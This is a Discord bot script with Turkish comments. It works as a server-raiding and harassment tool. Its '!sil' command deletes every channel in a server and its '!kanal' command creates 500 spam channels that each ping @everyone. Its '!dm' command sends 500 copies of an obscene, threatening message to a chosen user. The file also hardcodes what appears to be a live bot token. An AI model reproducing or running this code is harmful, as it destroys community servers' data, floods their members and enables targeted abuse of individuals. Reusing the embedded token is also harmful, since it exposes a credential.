const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
    console.log(`Bot ${client.user.tag} adıyla giriş yaptı!`);
});

client.on('message', message => {
  if (message.content === '!sil') {
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create('Bir son', {
      type: 'text',
      permissionOverwrites: [{
        id: message.guild.id,
        allow: ['VIEW_CHANNEL'],
      }],
    })
      .then(channel => {
        channel.send('@everyone');
      })
      .catch(console.error);
  }
});


client.on('message', message => {
  if (message.content === '!kanal') {
    for(let i = 0; i < 500; i++) { // 500 tane kanal açmak için döngü
      message.guild.channels.create('Rhaegar sikti', { // Kanal ismini belirleyebilirsiniz
        type: 'text',
        permissionOverwrites: [
          {
            id: message.guild.roles.everyone, // everyone atamak için everyone rolü kullanıyoruz
            allow: ['VIEW_CHANNEL']
          }
        ]
      })
      .then(channel => {
        channel.send('@everyone'); // Kanal oluşturulduktan sonra mesaj gönderiyoruz
      })
      .catch(console.error);
    }
  }
});

client.on('message', async (message) => {
  // Komutun doğru şekilde kullanılıp kullanılmadığını kontrol ediyoruz
  if (message.content.startsWith('!dm')) {
    const args = message.content.split(' ');
    if (args.length < 2) {
      return message.reply('Lütfen bir kullanıcı IDsi belirtin!');
    }
    const user_id = args[1];
    const user = await client.users.fetch(user_id);
    if (!user) {
      return message.reply('Belirtilen kullanıcı bulunamadı!');
    }
    // Mesaj gönderimi işlemini gerçekleştiriyoruz
    const message_count = 500; // Değiştirilecek
    const message_content = 'TIMARHANEYİ KAPATIRSAN DOKUNURSAN EFKARLI EFKARLI BAKARSAN GERÇEK SİKİŞİ YAŞATIRIM AMK OORRROSSPUSU'; // Değiştirilecek
    for (let i = 0; i < message_count; i++) {
      user.send(message_content);
    }
    message.reply(`Mesajlar ${user.tag} kullanıcısına gönderildi!`);
  }
});

client.login('MTA4MDg1NzI1MzY3NjA3NzE1Ng.GeN6t5.nWi_1GEGcLnoxm0i9NHZLbGpLQWPhL3CR3EA_g');
